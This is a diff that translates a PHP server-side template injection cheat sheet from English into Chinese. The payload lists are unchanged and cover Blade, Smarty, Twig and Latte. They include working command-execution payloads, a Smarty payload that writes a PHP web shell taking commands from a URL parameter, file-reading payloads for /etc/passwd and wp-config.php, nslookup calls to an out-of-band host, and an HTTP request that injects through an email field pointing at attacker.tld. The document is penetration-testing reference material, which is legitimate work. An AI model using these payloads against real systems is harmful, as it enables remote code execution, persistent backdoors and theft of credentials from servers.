@@ -1,27 +1,29 @@
-# Server Side Template Injection - PHP
+[原文文档](PHP.en.md)
 
-> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.
+# 服务器端模板注入 - PHP
 
-## Summary
+> 服务器端模板注入（SSTI）是一种漏洞，发生在攻击者可以将恶意输入注入服务器端模板中，导致模板引擎在服务器上执行任意命令。在PHP中，当用户输入嵌入在由模板引擎（如Smarty、Twig）呈现的模板中，甚至在普通PHP模板中，而没有适当的清理或验证时，就会出现SSTI。
 
-- [Templating Libraries](#templating-libraries)
+## 概述
+
+- [模板库](#模板库)
 - [Smarty](#smarty)
 - [Twig](#twig)
-    - [Twig - Basic Injection](#twig---basic-injection)
-    - [Twig - Template Format](#twig---template-format)
-    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
-    - [Twig - Code Execution](#twig---code-execution)
+    - [Twig - 基本注入](#twig---基本注入)
+    - [Twig - 模板格式](#twig---模板格式)
+    - [Twig - 任意文件读取](#twig---任意文件读取)
+    - [Twig - 代码执行](#twig---代码执行)
 - [Latte](#latte)
-    - [Latte - Basic Injection](#latte---basic-injection)
-    - [Latte - Code Execution](#latte---code-execution)
+    - [Latte - 基本注入](#latte---基本注入)
+    - [Latte - 代码执行](#latte---代码执行)
 - [patTemplate](#pattemplate)
-- [PHPlib](#phplib-and-html_template_phplib)
+- [PHPlib](#phplib和html_template_phplib)
 - [Plates](#plates)
-- [References](#references)
+- [参考资料](#参考资料)
 
-## Templating Libraries
+## 模板库
 
-| Template Name   | Payload Format |
+| 模板名称   | 负载格式 |
 | --------------- | --------- |
 | Blade (Laravel) | `{{ }}`   |
 | Latte           | `{var $X=""}{$X}`   |
@@ -32,10 +34,10 @@
 
 ## Blade
 
-[Official website](https://laravel.com/docs/master/blade)
-> Blade is the simple, yet powerful templating engine that is included with Laravel.
+[官方网站](https://laravel.com/docs/master/blade)
+> Blade是包含在Laravel中的简单而强大的模板引擎。
 
-The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.
+字符串`id`通过`{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`生成。
 
 ```php
 {{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
@@ -45,35 +47,35 @@ The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr
 
 ## Smarty
 
-[Official website](https://www.smarty.net/docs/en/)
-> Smarty is a template engine for PHP.
+[官方网站](https://www.smarty.net/docs/en/)
+> Smarty是PHP的模板引擎。
 
 ```php
 {$smarty.version}
-{php}echo `id`;{/php} //deprecated in smarty v3
+{php}echo `id`;{/php} //在smarty v3中已弃用
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-{system('ls')} // compatible v3
-{system('cat index.php')} // compatible v3
+{system('ls')} //兼容v3
+{system('cat index.php')} //兼容v3
 ```
 
 ---
 
 ## Twig
 
-[Official website](https://twig.symfony.com/)
-> Twig is a modern template engine for PHP.
+[官方网站](https://twig.symfony.com/)
+> Twig是PHP的现代模板引擎。
 
-### Twig - Basic Injection
+### Twig - 基本注入
 
 ```php
 {{7*7}}
-{{7*'7'}} would result in 49
+{{7*'7'}} 将导致49
 {{dump(app)}}
 {{dump(_context)}}
 {{app.request.server.all|join(',')}}
 ```
 
-### Twig - Template Format
+### Twig - 模板格式
 
 ```php
 $output = $twig > render (
@@ -87,14 +89,14 @@ $output = $twig > render (
 );
 ```
 
-### Twig - Arbitrary File Reading
+### Twig - 任意文件读取
 
 ```php
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
 {{include("wp-config.php")}}
 ```
 
-### Twig - Code Execution
+### Twig - 代码执行
 
 ```php
 {{self}}
@@ -111,13 +113,13 @@ $output = $twig > render (
 {{['nslookup oastify.com']|filter('system')}}
 ```
 
-Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
+注入值以避免对文件名使用引号的示例（通过OFFSET和LENGTH指定负载FILENAME的位置）
 
 ```python
 FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
 ```
 
-Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+通过FILTER_VALIDATE_EMAIL PHP的电子邮件示例。
 
 ```powershell
 POST /subscribe?0=cat+/etc/passwd HTTP/1.1
@@ -128,13 +130,13 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ## Latte
 
-### Latte - Basic Injection
+### Latte - 基本注入
 
 ```php
 {var $X="POC"}{$X}
 ```
 
-### Latte - Code Execution
+### Latte - 代码执行
 
 ```php
 {php system('nslookup oastify.com')}
@@ -144,7 +146,7 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ## patTemplate
 
-> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts
+> [patTemplate](https://github.com/wernerwa/pat-template) 非编译的PHP模板引擎，使用XML标签将文档划分为不同部分
 
 ```xml
 <patTemplate:tmpl name="page">
@@ -160,9 +162,9 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ---
 
-## PHPlib and HTML_Template_PHPLIB
+## PHPlib和HTML_Template_PHPLIB
 
-[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB) is the same as PHPlib but ported to Pear.
+[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB)与PHPlib相同，但移植到Pear。
 
 `authors.tpl`
 
@@ -192,32 +194,32 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ```php
 <?php
-//we want to display this author list
+//我们想显示这个作者列表
 $authors = array(
     'Christian Weiske'  => 'cweiske@php.net',
     'Bjoern Schotte'     => 'schotte@mayflower.de'
 );
 
 require_once 'HTML/Template/PHPLIB.php';
-//create template object
+//创建模板对象
 $t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
-//load file
+//加载文件
 $t->setFile('authors', 'authors.tpl');
-//set block
+//设置块
 $t->setBlock('authors', 'authorline', 'authorline_ref');
 
-//set some variables
+//设置一些变量
 $t->setVar('NUM_AUTHORS', count($authors));
 $t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));
 
-//display the authors
+//显示作者
 foreach ($authors as $name => $email) {
     $t->setVar('AUTHOR_NAME', $name);
     $t->setVar('AUTHOR_EMAIL', $email);
     $t->parse('authorline_ref', 'authorline', true);
 }
 
-//finish and echo
+//完成并输出
 echo $t->finish($t->parse('OUT', 'authors'));
 ?>
 ```
@@ -226,19 +228,19 @@ echo $t->finish($t->parse('OUT', 'authors'));
 
 ## Plates
 
-Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.
+Plates受Twig启发，但是原生PHP模板引擎而不是编译模板引擎。
 
-controller:
+控制器：
 
 ```php
-// Create new Plates instance
+//创建新的Plates实例
 $templates = new League\Plates\Engine('/path/to/templates');
 
-// Render a template
+//渲染模板
 echo $templates->render('profile', ['name' => 'Jonathan']);
 ```
 
-page template:
+页面模板：
 
 ```php
 <?php $this->layout('template', ['title' => 'User Profile']) ?>
@@ -247,7 +249,7 @@ page template:
 <p>Hello, <?=$this->e($name)?></p>
 ```
 
-layout template:
+布局模板：
 
 ```php
 <html>
@@ -260,7 +262,7 @@ layout template:
 </html>
 ```
 
-## References
+## 参考资料
 
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere- YesWeHack - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
-- [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
+- [局限性只是幻觉 – 在各处通过RCE进行高级服务器端模板利用 - YesWeHack - 2025年3月24日](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [通过Twig转义处理程序的服务器端模板注入（SSTI） - 2024年3月21日](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
